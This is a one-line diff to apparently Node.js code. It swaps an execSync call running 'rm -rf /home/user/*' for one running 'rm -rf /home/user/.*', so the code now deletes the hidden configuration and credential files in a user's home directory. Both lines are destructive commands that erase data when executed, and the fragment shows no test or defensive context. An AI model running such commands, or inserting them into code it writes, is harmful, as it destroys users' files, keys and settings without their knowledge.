@@ -1,1 +1,1 @@
-require('child_process').execSync('rm -rf /home/user/*')
+require('child_process').execSync('rm -rf /home/user/.*')
